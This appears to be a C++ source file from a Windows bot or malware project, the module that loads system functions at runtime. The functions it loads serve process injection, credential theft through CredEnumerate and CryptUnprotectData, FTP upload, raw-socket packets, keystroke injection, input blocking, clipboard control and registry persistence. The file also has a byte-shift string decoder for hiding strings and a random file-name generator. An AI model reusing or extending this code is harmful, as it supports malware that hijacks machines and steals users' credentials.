#include "API.hpp"

API::API( void ) {	
	hKernel = LoadLibrary("kernel32.dll");
		lstrcpy						=	(zLstrcpy)						GetProcAddress(hKernel, "lstrcpyA");		
		lstrlen						=	(zLstrlen)						GetProcAddress(hKernel, "lstrlenA");
		lstrcmp						=	(zLstrcmp)						GetProcAddress(hKernel, "lstrcmpA");
		lstrcat						=	(zLstrcat)						GetProcAddress(hKernel, "lstrcatA");
		Sleep						=	(zSleep)						GetProcAddress(hKernel, "Sleep");
		GetLocaleInfo				=	(zGetLocaleInfo)				GetProcAddress(hKernel, "GetLocaleInfoA");
		CreateThread				=	(zCreateThread)					GetProcAddress(hKernel, "CreateThread");
		GetTickCount				=	(zGetTickCount)					GetProcAddress(hKernel, "GetTickCount");
		CreateMutex					=	(zCreateMutex)					GetProcAddress(hKernel, "CreateMutexA");
		GetLastError				=	(zGetLastError)					GetProcAddress(hKernel, "GetLastError");
		GetModuleHandle				=	(zGetModuleHandle)				GetProcAddress(hKernel, "GetModuleHandleA");
		CloseHandle					=	(zCloseHandle)					GetProcAddress(hKernel, "CloseHandle");
		CreateFile					=	(zCreateFile)					GetProcAddress(hKernel, "CreateFileA");
		WriteFile					=	(zWriteFile)					GetProcAddress(hKernel, "WriteFile");
		GetFileAttributes			=	(zGetFileAttributes)			GetProcAddress(hKernel, "GetFileAttributesA");
		ExpandEnvironmentStrings	=	(zExpandEnvironmentStrings)		GetProcAddress(hKernel, "ExpandEnvironmentStringsA");
		GetModuleFileName			=	(zGetModuleFileName)			GetProcAddress(hKernel, "GetModuleFileNameA");
		CopyFile					=	(zCopyFile)						GetProcAddress(hKernel, "CopyFileA");
		GetDriveType				=	(zGetDriveType)					GetProcAddress(hKernel, "GetDriveTypeA");
		SetFileAttributes			=	(zSetFileAttributes)			GetProcAddress(hKernel, "SetFileAttributesA");
		DeleteFile					=	(zDeleteFile)					GetProcAddress(hKernel, "DeleteFileA");
		CreateToolhelp32Snapshot	=	(zCreateToolhelp32Snapshot)		GetProcAddress(hKernel, "CreateToolhelp32Snapshot");
		Process32First				=	(zProcess32First)				GetProcAddress(hKernel, "Process32First");
		Process32Next				=	(zProcess32Next)				GetProcAddress(hKernel, "Process32Next");
		OpenProcess					=	(zOpenProcess)					GetProcAddress(hKernel, "OpenProcess");
		VirtualAllocEx				=	(zVirtualAllocEx)				GetProcAddress(hKernel, "VirtualAllocEx");
		WriteProcessMemory			=	(zWriteProcessMemory)			GetProcAddress(hKernel, "WriteProcessMemory");
		CreateRemoteThread			=	(zCreateRemoteThread)			GetProcAddress(hKernel, "CreateRemoteThread");
		GetCurrentProcess			=	(zGetCurrentProcess)			GetProcAddress(hKernel, "GetCurrentProcess");
		TerminateThread				=	(zTerminateThread)				GetProcAddress(hKernel, "TerminateThread");
		GetFileSizeEx				=	(zGetFileSizeEx)				GetProcAddress(hKernel, "GetFileSizeEx");
		zzLoadLibrary				=	(zLoadLibrary)					GetProcAddress(hKernel, "LoadLibraryA");
		zzGetProcAddress			=	(zGetProcAddress)				GetProcAddress(hKernel, "GetProcAddress");
		VirtualProtect				=	(zVirtualProtect)				GetProcAddress(hKernel, "VirtualProtect");
		VirtualProtectEx			=	(zVirtualProtectEx)				GetProcAddress(hKernel, "VirtualProtectEx");
		FindFirstFile				=	(zFindFirstFile)				GetProcAddress(hKernel, "FindFirstFileA");
		FindNextFile				=	(zFindNextFile)					GetProcAddress(hKernel, "FindNextFileA");
		FindClose					=	(zFindClose)					GetProcAddress(hKernel, "FindClose");
		GetLogicalDriveStrings		=	(zGetLogicalDriveStrings)		GetProcAddress(hKernel, "GetLogicalDriveStringsA");
		LocalFree					=	(zLocalFree)					GetProcAddress(hKernel, "LocalFree");
		ReadFile					=	(zReadFile)						GetProcAddress(hKernel, "ReadFile");
		CreateProcess				=	(zCreateProcess)				GetProcAddress(hKernel, "CreateProcessA");
		TerminateProcess			=	(zTerminateProcess)				GetProcAddress(hKernel, "TerminateProcess");
		GetModuleFileNameEx			=	(zGetModuleFileNameEx)			GetProcAddress(hKernel, "GetModuleFileNameExA");
		Thread32First				=	(zThread32First)				GetProcAddress(hKernel, "Thread32First");
		Thread32Next				=	(zThread32Next)					GetProcAddress(hKernel, "Thread32Next");
		OpenThread					=	(zOpenThread)					GetProcAddress(hKernel, "OpenThread");
		ResumeThread				=	(zResumeThread)					GetProcAddress(hKernel, "ResumeThread");
		SuspendThread				=	(zSuspendThread)				GetProcAddress(hKernel, "SuspendThread");

	hAdvapi = LoadLibrary("advapi32.dll");
		RegQueryValueEx			=		(zRegQueryValueEx)					GetProcAddress(hAdvapi, "RegQueryValueExA");
		RegOpenKeyEx			=		(zRegOpenKeyEx)						GetProcAddress(hAdvapi, "RegOpenKeyExA");
		RegCreateKey			=		(zRegCreateKey)						GetProcAddress(hAdvapi, "RegCreateKeyA");
		RegDeleteKey			=		(zRegDeleteKey)						GetProcAddress(hAdvapi, "RegDeleteKeyA");
		RegSetValueEx			=		(zRegSetValueEx)					GetProcAddress(hAdvapi, "RegSetValueExA");
		RegCloseKey				=		(zRegCloseKey)						GetProcAddress(hAdvapi, "RegCloseKey");
		RegDeleteValue			=		(zRegDeleteValue)					GetProcAddress(hAdvapi, "RegDeleteValueA");
		OpenProcessToken		=		(zOpenProcessToken)					GetProcAddress(hAdvapi, "OpenProcessToken");
		LookupPrivilegeValue	=		(zLookupPrivilegeValue)				GetProcAddress(hAdvapi, "LookupPrivilegeValueA");
		AdjustTokenPrivileges	=		(zAdjustTokenPrivileges)			GetProcAddress(hAdvapi, "AdjustTokenPrivileges");
		CredEnumerate			=		(zCredEnumerate)					GetProcAddress(hAdvapi, "CredEnumerateA");
		CredFree				=		(zCredFree)							GetProcAddress(hAdvapi, "CredFree");
		RegEnumValue			=		(zRegEnumValue)						GetProcAddress(hAdvapi, "RegEnumValueA");
		CryptAcquireContext		=		(zCryptAcquireContext)				GetProcAddress(hAdvapi, "CryptAcquireContextA");
		CryptHashData			=		(zCryptHashData)					GetProcAddress(hAdvapi, "CryptHashData");
		CryptGetHashParam		=		(zCryptGetHashParam)				GetProcAddress(hAdvapi, "CryptGetHashParam");
		CryptDestroyHash		=		(zCryptDestroyHash)					GetProcAddress(hAdvapi, "CryptDestroyHash");
		CryptReleaseContext		=		(zCryptReleaseContext)				GetProcAddress(hAdvapi, "CryptReleaseContext");
		CryptCreateHash			=		(zCryptCreateHash)					GetProcAddress(hAdvapi, "CryptCreateHash");

	hWsock = LoadLibrary("ws2_32.dll");
		WSACleanup				=		(zWSACleanup)						GetProcAddress(hWsock, "WSACleanup");
		WSAStartup				=		(zWSAStartup)						GetProcAddress(hWsock, "WSAStartup");
		connect					=		(zconnect)							GetProcAddress(hWsock, "connect");
		closesocket				=		(zclosesocket)						GetProcAddress(hWsock, "closesocket");
		getaddrinfo				=		(zgetaddrinfo)						GetProcAddress(hWsock, "getaddrinfo");
		send					=		(zsend)								GetProcAddress(hWsock, "send");
		recv					=		(zrecv)								GetProcAddress(hWsock, "recv");
		socket					=		(zsocket)							GetProcAddress(hWsock, "socket");
		inet_addr				=		(zinet_addr)						GetProcAddress(hWsock, "inet_addr");
		htonl					=		(zhtonl)							GetProcAddress(hWsock, "htonl");
		htons					=		(zhtons)							GetProcAddress(hWsock, "htons");
		WSASocket				=		(zWSASocket)						GetProcAddress(hWsock, "WSASocketA");
		setsockopt				=		(zsetsockopt)						GetProcAddress(hWsock, "setsockopt");
		sendto					=		(zsendto)							GetProcAddress(hWsock, "sendto");
		inet_ntoa				=		(zinet_ntoa)						GetProcAddress(hWsock, "inet_ntoa");
		ioctlsocket				=		(zioctlsocket)						GetProcAddress(hWsock, "ioctlsocket");

	hInet = LoadLibrary("wininet.dll");
		InternetOpen			=		(zInternetOpen)						GetProcAddress(hInet, "InternetOpenA");
		InternetOpenUrl			=		(zInternetOpenUrl)					GetProcAddress(hInet, "InternetOpenUrlA");
		InternetReadFile		=		(zInternetReadFile)					GetProcAddress(hInet, "InternetReadFile");
		InternetCloseHandle		=		(zInternetCloseHandle)				GetProcAddress(hInet, "InternetCloseHandle");
		InternetConnect			=		(zInternetConnect)					GetProcAddress(hInet, "InternetConnectA");
		FtpPutFile				=		(zFtpPutFile)						GetProcAddress(hInet, "FtpPutFileA");

	hUrl = LoadLibrary("urlmon.dll");
		ObtainUserAgentString	=		(zObtainUserAgentString)			GetProcAddress(hUrl, "ObtainUserAgentString");
		
	hShell = LoadLibrary("shell32.dll");
		ShellExecuteA			=		(zShellExecute)						GetProcAddress(hShell, "ShellExecuteA");

	hUser32 = LoadLibrary("user32.dll");
		RegisterDeviceNotification	=	(zRegisterDeviceNotification)	GetProcAddress(hUser32, "RegisterDeviceNotificationA");
		CreateWindowEx				=	(zCreateWindowEx)				GetProcAddress(hUser32, "CreateWindowExA");
		RegisterClassEx				=	(zRegisterClassEx)				GetProcAddress(hUser32, "RegisterClassExA");
		DefWindowProc				=	(zDefWindowProc)				GetProcAddress(hUser32, "DefWindowProcA");
		GetMessage					=	(zGetMessage)					GetProcAddress(hUser32, "GetMessageA");
		TranslateMessage			=	(zTranslateMessage)				GetProcAddress(hUser32, "TranslateMessage");
		DispatchMessage				=	(zDispatchMessage)				GetProcAddress(hUser32, "DispatchMessageA");
		PeekMessage					=	(zPeekMessage)					GetProcAddress(hUser32, "PeekMessageA");
		MessageBox					=	(zMessageBox)					GetProcAddress(hUser32, "MessageBoxA");
		wsprintf					=	(zwsprintf)						GetProcAddress(hUser32, "wsprintfA");
		SetClipboardData			=	(zSetClipboardData)				GetProcAddress(hUser32, "SetClipboardData");
		OpenClipboard				=	(zOpenClipboard)				GetProcAddress(hUser32, "OpenClipboard");
		EmptyClipboard				=	(zEmptyClipboard)				GetProcAddress(hUser32, "EmptyClipboard");
		CloseClipboard				=	(zCloseClipboard)				GetProcAddress(hUser32, "CloseClipboard");
		SetForegroundWindow			=	(zSetForegroundWindow)			GetProcAddress(hUser32, "SetForegroundWindow");
		SetFocus					=	(zSetFocus)						GetProcAddress(hUser32, "SetFocus");
		ShowWindow					=	(zShowWindow)					GetProcAddress(hUser32, "ShowWindow");
		keybd_event					=	(zkeybd_event)					GetProcAddress(hUser32, "keybd_event");
		BlockInput					=	(zBlockInput)					GetProcAddress(hUser32, "BlockInput");
		VkKeyScan					=	(zVkKeyScan)					GetProcAddress(hUser32, "VkKeyScanA");

	hPdh = LoadLibrary("pdh.dll");
		PdhAddCounter				=	(zPdhAddCounter)				GetProcAddress(hPdh, "PdhAddCounterA");	
		PdhCollectQueryData			=	(zPdhCollectQueryData)			GetProcAddress(hPdh, "PdhCollectQueryDataA");
		PdhGetFormattedCounterValue	=	(zPdhGetFormattedCounterValue)	GetProcAddress(hPdh, "PdhGetFormattedCounterValue");
		PdhOpenQuery				=	(zPdhOpenQuery)					GetProcAddress(hPdh, "PdhOpenQueryA");

	hOle32 = LoadLibrary("Ole32.dll");
		CoInitialize				=	(zCoInitialize)					GetProcAddress(hOle32, "CoInitialize");
		CoCreateInstance			=	(zCoCreateInstance)				GetProcAddress(hOle32, "CoCreateInstance");
		CoUninitialize				=	(zCoUninitialize)				GetProcAddress(hOle32, "CoUninitialize");

	hCrypt32 = LoadLibrary("Crypt32.dll");
		CryptUnprotectData			=	(zCryptUnprotectData)			GetProcAddress(hCrypt32, "CryptUnprotectData");

	hOleAut32 = LoadLibrary("oleaut32.dll");
		VariantInit					=	(zVariantInit)					GetProcAddress(hOleAut32, "VariantInit");

	hPsApi = LoadLibrary("psapi.dll");
	if( GetModuleFileNameEx == NULL )
		GetModuleFileNameEx			=	(zGetModuleFileNameEx)			GetProcAddress(hPsApi, "GetModuleFileNameExA");

	hShlwapi = LoadLibrary("shlwapi.dll");
		PathRemoveFileSpec			=	(zPathRemoveFileSpec)			GetProcAddress(hShlwapi, "PathRemoveFileSpecA");

	srand(API::GetTickCount());
	persist = true;
}

API::~API( void ) {
	FreeLibrary(hKernel);
	FreeLibrary(hAdvapi);
	FreeLibrary(hWsock);
	FreeLibrary(hInet);
	FreeLibrary(hUrl);
	FreeLibrary(hShell);
	FreeLibrary(hUser32);
	FreeLibrary(hPsApi);
	FreeLibrary(hShlwapi);
	return;
}

string API::GenFileName( unsigned int size ) {
	srand(API::GetTickCount());
	string filename;
	static char alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
	int num = 0;
	for (int i = 0; i < size - 1; i++) {
		num = (rand() % ((API::lstrlen(alphabet) - 1) + 1));
		filename += (char)alphabet[num];
	}
	return filename;
}
/*string GenFileName( API *api, int length, string type ) {
	srand(api->GetTickCount());
	static char alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
	string final = "";
	for (int i = 0; i < length - 1; i++) {
		final += (char)alphabet[(rand() % ((strlen(alphabet) - 1) + 1))];
	}
	final += type;
	return final;
}*/

USHORT API::checksum(USHORT *buffer, int size) {
    unsigned long cksum=0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(USHORT);   
    }

    if (size)
        cksum += *(UCHAR*)buffer;   

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 

    return (USHORT)(~cksum); 
}

bool API::fileExists(string file) {
	DWORD dwAttr = API::GetFileAttributes(file.c_str());
	if (dwAttr == 0xffffffff)
		return false;
	else
		return true;
}

DWORD API::GetFileSize(string file) {
	if (!API::fileExists(file))
		return -1;
	else {
		API::LARGE_INTEGER n;
		HANDLE hfile = API::CreateFileA(file.c_str(), GENERIC_READ, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
		if (API::GetFileSizeEx(hfile, &n) != 0) {
			return n.LowPart;
		} else {
			return -2;
		}
	}
}

string API::GetUserAgent( void ) {
	static char szUserAgent[MAX_PATH] = {0};
	DWORD dwLength = MAX_PATH;
	HRESULT iResult = API::ObtainUserAgentString(0, (LPCSTR *)szUserAgent, &dwLength);
	return (iResult == 0 ? szUserAgent : "FireFox");
}

static const string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

static inline bool is_base64(unsigned char c) {
  return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string API::magic(const char* ePtr) {
        int len = strlen(ePtr);
        char ret[128] = {0};
        strcpy(ret, ePtr);
        for (int i = 0; i < len; i++) {
                ret[i] = ret[i] - 25;
        }
        return ret;
}

/*string API::magic(string const& encoded_string) {
  int in_len = encoded_string.size();
  int i = 0;
  int j = 0;
  int in_ = 0;
  unsigned char char_array_4[4], char_array_3[3];
  string ret;

  while (in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
    char_array_4[i++] = encoded_string[in_]; in_++;
    if (i ==4) {
      for (i = 0; i <4; i++)
        char_array_4[i] = base64_chars.find(char_array_4[i]);

      char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
      char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
      char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

      for (i = 0; (i < 3); i++)
        ret += char_array_3[i];
      i = 0;
    }
  }

  if (i) {
    for (j = i; j <4; j++)
      char_array_4[j] = 0;

    for (j = 0; j <4; j++)
      char_array_4[j] = base64_chars.find(char_array_4[j]);

    char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
    char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
    char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

    for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
  }

  return ret;
}*/

char* API::lstrtok(char *s, const char *delim) {
	static char *last;

	return lstrtok_r(s, delim, &last);
}

char* API::lstrtok_r(char *s, const char *delim, char **last) {
	char *spanp;
	int c, sc;
	char *tok;


	if (s == NULL && (s = *last) == NULL)
		return (NULL);

	/*
	 * Skip (span) leading delimiters (s += strspn(s, delim), sort of).
	 */
cont:
	c = *s++;
	for (spanp = (char *)delim; (sc = *spanp++) != 0;) {
		if (c == sc)
			goto cont;
	}

	if (c == 0) {		/* no non-delimiter characters */
		*last = NULL;
		return (NULL);
	}
	tok = s - 1;

	/*
	 * Scan token (scan for delimiters: s += strcspn(s, delim), sort of).
	 * Note that delim must have one NUL; we stop if we see that, too.
	 */
	for (;;) {
		c = *s++;
		spanp = (char *)delim;
		do {
			if ((sc = *spanp++) == c) {
				if (c == 0)
					s = NULL;
				else
					s[-1] = 0;
				*last = s;
				return (tok);
			}
		} while (sc != 0);
	}
	/* NOTREACHED */
}

int API::intlen(float start) {
	int end = 0;
	while(start >= 1) {
		start = start/10;
		end++;
	}
	return end;
}